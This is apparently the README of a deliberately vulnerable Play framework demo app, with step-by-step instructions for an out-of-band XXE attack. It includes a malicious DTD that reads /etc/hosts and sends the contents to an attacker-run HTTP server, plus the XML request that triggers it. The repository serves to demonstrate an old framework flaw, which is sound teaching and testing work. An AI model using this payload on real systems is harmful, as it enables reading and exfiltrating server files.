# Vulnerable Play application

The point for this repo is to show how easy is to do XXE attack on old version of the framework

## Steps

### Step 1
Run the app `sbt run`

### Step 2 
Create a service to serve malicious content. 

``ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'``

### Step 3
Create malicious input as file test.dtd

```xml
 <!ENTITY % p1 SYSTEM "file:///etc/hosts">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://127.0.0.1:8000/BLAH?%p1;'>">
 %p2;
``` 


### Step 4
Query the service:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://127.0.0.1:8000/test.dtd">
<foo>&e1;</foo>
```
 